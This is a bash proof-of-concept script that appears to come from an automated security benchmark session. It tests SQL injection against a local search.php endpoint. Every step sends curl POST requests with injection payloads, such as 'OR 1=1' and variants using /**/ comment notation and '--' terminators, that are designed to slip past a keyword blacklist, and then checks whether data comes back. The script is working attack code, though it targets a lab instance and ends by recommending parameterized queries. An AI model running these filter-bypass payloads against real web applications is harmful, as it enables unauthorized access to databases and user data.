#!/bin/bash
# POC: SQL Injection in search.php with comment notation bypass - Demonstrates blacklist filter bypass using /**/ comments and proves SQL injection exists despite input filtering
# Target: ./repo
# Created: 2025-11-07T18:44:20.558Z
# Session: benchmark-XBEN-095-24-mhp70jbg

# SQL Injection - Comment Notation Bypass POC
# This script demonstrates SQL injection vulnerability in search.php
# despite the presence of a blacklist filter

TARGET="http://localhost:8080/search.php"
CONTENT_TYPE="Content-Type: application/x-www-form-urlencoded"

echo "======================================"
echo "SQL Injection - Comment Bypass POC"
echo "======================================"
echo ""

# Test 1: Verify SQL keyword filtering is in place
echo "[Test 1] Verifying blacklist filter blocks direct SQL keywords..."
echo "Payload: admin' OR 1=1"
RESPONSE=$(curl -s -X POST "$TARGET" -H "$CONTENT_TYPE" -d "username=admin' OR 1=1")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "filtered"; then
    echo "✓ Filter detected and blocked SQL keywords"
else
    echo "✗ Filter did not respond with expected message"
fi
echo ""

# Test 2: Demonstrate comment notation bypass
echo "[Test 2] Testing comment notation bypass (/**/)..."
echo "Payload: admin'/**/or/**/1=1"
RESPONSE=$(curl -s -X POST "$TARGET" -H "$CONTENT_TYPE" -d "username=admin'/**/or/**/1=1")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "filtered"; then
    echo "✗ Filter still blocking - bypass unsuccessful"
else
    echo "✓ Filter bypassed - SQL comment notation works"
    echo "✓ SQL Injection confirmed - injection processed without filter error"
fi
echo ""

# Test 3: Confirm query structure with quote manipulation
echo "[Test 3] Confirming query structure..."
echo "Payload 1: admin (valid user)"
RESPONSE1=$(curl -s -X POST "$TARGET" -H "$CONTENT_TYPE" -d "username=admin")
echo "Response: $RESPONSE1"
echo ""

echo "Payload 2: admin' (quote injection)"
RESPONSE2=$(curl -s -X POST "$TARGET" -H "$CONTENT_TYPE" -d "username=admin'")
echo "Response: $RESPONSE2"
echo ""

# Test 4: Demonstrate SQL injection with comment bypass for data extraction
echo "[Test 4] Testing SQL injection with comment bypass for condition manipulation..."
echo "Payload: '/**/or/**/1=1/*"
RESPONSE=$(curl -s -X POST "$TARGET" -H "$CONTENT_TYPE" -d "username='/**/or/**/1=1/*")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q "filtered"; then
    echo "✗ Filter blocked the payload"
else
    echo "✓ Payload processed without filter error"
    if ! echo "$RESPONSE" | grep -q "No results"; then
        echo "✓ SQL Injection successful - returned data instead of 'No results'"
    fi
fi
echo ""

# Test 5: Test alternative comment bypass
echo "[Test 5] Testing alternative bypass with -- comment..."
echo "Payload: admin'/**/or/**/1=1--"
RESPONSE=$(curl -s -X POST "$TARGET" -H "$CONTENT_TYPE" -d "username=admin'/**/or/**/1=1--")
echo "Response: $RESPONSE"
if ! echo "$RESPONSE" | grep -q "filtered"; then
    echo "✓ Alternative bypass processed without filter error"
fi
echo ""

echo "======================================"
echo "POC Summary:"
echo "- Blacklist filter successfully bypassed with /**/ notation"
echo "- SQL injection vulnerability confirmed despite filtering"
echo "- Query structure identified: WHERE username = 'INPUT'"
echo "- Parameterized queries needed for proper protection"
echo "======================================"